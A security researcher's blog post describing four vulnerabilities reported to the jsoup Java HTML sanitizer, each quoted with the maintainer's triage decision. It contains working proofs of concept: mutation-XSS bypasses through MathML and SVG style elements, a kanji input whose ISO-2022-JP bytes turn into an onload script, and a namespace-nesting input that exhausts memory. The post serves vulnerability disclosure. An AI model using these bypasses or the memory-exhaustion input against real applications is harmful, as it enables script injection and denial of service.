---
layout: post
title: "4 jsoup vulnerabilities"
tags: [security, vuln_research, web_platform]
description: "An overview of four vulnerabilities I reported in jsoup, the Java HTML parser and sanitizer: mutation-XSS sanitizer bypasses, output-charset byte smuggling, and a quadratic namespace blowup, and how each was triaged."
---

## Cleaner HTML-sanitizer bypass: mutation-XSS via MathML namespace confusion

Reported as:

```
Inside MathML foreign content, <style> is a raw-text element. jsoup therefore stores <img src=x onerror=...> as opaque text (a DataNode) and copies it verbatim, so it never sees an img element or an onerror attribute to strip. When a browser re-parses jsoup's serialized output under HTML5 MathML text-integration-point rules, that text turns back into a live <img onerror> and fires. The bug is a differential between parsing, serializing, and re-parsing (mXSS). jsoup already rejects noscript in safelists for this same class of problem (see Safelist.addTags), but it has no equivalent guard for math or svg combined with a raw-text element.

Safelist sl = Safelist.none().addTags("math", "mtext", "table", "mglyph", "style");
String out = Jsoup.clean("<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style>", sl);

out still contains <img src=x onerror=alert(1)> inside <style>. Render it in any HTML page and alert(1) fires on load.
```

Closed and not fixed as:

```
The built-in Safelists are unaffected. The reported result requires a custom Safelist that explicitly permits both MathML content and the raw-text style element.

jsoup’s built-in Safelists provide supported safe defaults. Applications that extend them define their own security policy and are responsible for ensuring that the added elements and attributes are safe for their use. In particular, permitting style does not cause jsoup to parse or sanitize its CSS or raw-text contents.

This also falls under section 4.1.3 of the CVE CNA Operational Rules (https://www.cve.org/ResourcesSupport/AllResources/CNARules), which says:
  Well-documented or commonly understood non-default configuration or runtime changes made by an authorized user SHOULD NOT be determined to be Vulnerabilities.

The current Safelist API is based on element names rather than namespaces. Namespace-aware Safelists are a documented improvement plan in Cleaner & Safelist API revamp <https://github.com/jhy/jsoup/issues/2284>, but that does not make this non-default configuration a vulnerability in the existing Cleaner.
```

## Cleaner mutation-XSS: `<s>` before SVG `<style>` defeats onerror sanitization

Reported as:

```
A browser breaks out of SVG foreign content at `<s>`, so `<style>` is an HTML rawtext element and `<img src=x onerror=...>` is inert CSS text.

jsoup doesn't break out at `<s>`. It keeps `<style>` under `<svg>` and treats its content as raw text, so `<img src=x onerror=...>` survives verbatim and `onerror` is never stripped. The Cleaner drops the non-safelisted `<s>`, leaving `<style>` as a direct child of `<svg>`. On re-parse, SVG-namespace `<style>` content is live markup, `<img>` breaks out to a real HTML element, and `onerror` fires.

jsoup normally gets this right: the control `<svg><style><img src=x onerror=alert(1)></style></svg>` (no `<s>`) cleans to `<svg><style><img src="..."></style></svg>`, `onerror` stripped. A preceding formatting element (`s`, `big`, `nobr`, `tt`, `listing`) is what flips it into rawtext mode.

import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;

Safelist sl = Safelist.relaxed().addTags("svg", "style");

String input = "<svg><s><style><img src=x onerror=alert(1)></style></svg>";
System.out.println(Jsoup.clean(input, sl));
// => <svg><style><img src=x onerror=alert(1)></style></svg>

Render the output and `alert(1)` fires on load. The trigger `<s>` doesn't even need to be on the safelist.
```

Closed as (and fixed without a sec advisory):

```
This has the same security boundary as your MathML report. The built-in Safelists are unaffected, and the payload only succeeds after the application explicitly adds both SVG and the raw-text style element.

For the reasons given in my response there, this is an application-defined, non-default security policy and falls under section 4.1.3 of the CVE CNA Operational Rules.

This report does reveal a separate HTML parser conformance issue in foreign-content breakout handling. I will consider that as an ordinary parser correctness improvement rather than a jsoup vulnerability: https://github.com/jhy/jsoup/issues/2562.
```

## Cleaner XSS via output-charset byte smuggling in ISO-2022-JP/KR

Reported as:

```
Jsoup.clean() can be bypassed with input that contains no markup characters at all, defeating even Safelist.none(). The problem is the escape layer under a non-ASCII-transparent output charset (ISO-2022-JP/KR, UTF-7, HZ-GB-2312). Confirmed on 1.23.1.

Under ISO-2022-JP, Entities.escape writes CJK characters literally instead of as numeric references. Some of those characters encode to bytes in 0x21–0x7E that are <, >, /, =. So a kanji string passes the cleaner as plain text, but the serialized bytes read <svg/onload=...>. Decode those bytes as UTF-8 and the browser runs the script.

Parsing an ISO-2022-JP source (Jsoup.connect(url).get() or Jsoup.parse(in, "ISO-2022-JP", ...)) sets doc.outputSettings().charset() to ISO-2022-JP, and Cleaner.clean() inherits it while dropping the source <meta charset>. So the attacker who controls the fetched or uploaded content controls the charset, with no OutputSettings.charset(...) call anywhere.

The one precondition: the cleaned output is serialized as ISO-2022-JP bytes but then delivered under a different charset (UTF-8, Latin-1, or none). That happens when an app serializes with the document's own charset but labels the response UTF-8, or embeds the head-less fragment in a UTF-8 page. Matching charsets are safe.

import org.jsoup.*; import org.jsoup.safety.*; import org.jsoup.nodes.*;
import java.io.*;

// Pure text: no '<', '>', '&'. These kanji encode to the bytes "<svg/onload=alert`1`>".
byte[] page = ("<html><head><meta http-equiv=\"Content-Type\" content=\"text/html;charset=ISO-2022-JP\"></head>"
             + "<body><p>畆齧膀闔跫痲潤跂鶯牘狆</p></body></html>").getBytes("ISO-2022-JP");

Document doc = Jsoup.parse(new ByteArrayInputStream(page), null, "http://site.jp/");
Document safe = new Cleaner(Safelist.relaxed()).clean(doc);
byte[] out = safe.body().html().getBytes(safe.outputSettings().charset());
// out = <p><ESC>$Ba<svg/onload=alert`1`><ESC>(B</p>
```

Closed but not fixed as:

```
This is not a vulnerability in jsoup.

The PoC encodes jsoup’s output as ISO-2022-JP and then serves or interprets those bytes as UTF-8. Those are contradictory encoding instructions.

jsoup returns a safe Unicode string and neither produces nor labels the incorrectly encoded HTTP response. When the bytes are decoded using the charset with which they were encoded, the output remains safe. Encoding the returned string normally as UTF-8 is also safe.

The reported XSS is therefore introduced entirely by the application after jsoup has completed its work. I am closing this advisory without a code change.
```


## Quadratic blowup in namespace handling

Reported as:

```
XmlTreeBuilder copies the entire inherited namespace map on every start tag. If elements each declare a namespace as they nest, that map grows with depth, so the per-element copy is O(depth) and the whole parse is O(n²) in both time and memory. A few MB of nested XML stalls for seconds and then OOMs the JVM. You don't have to ask for the XML parser to hit this. Jsoup.connect(url).get() switches to it on its own when the response Content-Type looks like XML, and that path never sets a depth limit.

import org.jsoup.*;
import org.jsoup.parser.*;

public class Poc {
  static long parse(String xml) {
    long t = System.nanoTime();
    Jsoup.parse(xml, "", Parser.xmlParser());
    return (System.nanoTime() - t) / 1_000_000;
  }
  static String build(int n, boolean growNs) {
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < n; i++)
      sb.append(growNs ? "<a xmlns:p" + i + "=\"urn:" + i + "\">" : "<a>");
    for (int i = 0; i < n; i++) sb.append("</a>");
    return sb.toString();
  }
  public static void main(String[] a) {
    parse(build(2000, true)); // warmup
    for (int n : new int[]{2000, 4000, 8000, 16000, 32000})
      System.out.println(n + "\t" + parse(build(n, true)) + "ms");
  }
}

OpenJDK 25, jsoup 1.23.2, one xmlns per level:
depth 	time
2,000 	112 ms
4,000 	578 ms
8,000 	2,253 ms
16,000 	7,238 ms
32,000 	OutOfMemoryError

Doubling the depth roughly quadruples the time. The same structure without the per-level xmlns stays around 3 ms all the way up, which pins it on the namespace copy rather than the nesting itself. At 32k it dies allocating the next copy:

java.lang.OutOfMemoryError: Java heap space
  at java.util.HashMap.<init>(HashMap.java:493)
  at org.jsoup.parser.XmlTreeBuilder.insertElementFor(XmlTreeBuilder.java:148)
```

Closed as (and fixed without a sec release):

```
I don't plan to publish this as a security advisory or request a CVE. The reported impact is resource exhaustion from attacker-controlled input, without a confidentiality or integrity impact or a bypass of a jsoup security boundary. Applications processing untrusted content remain responsible for applying appropriate input and resource limits, and for isolating failed parsing work where availability is critical.
```
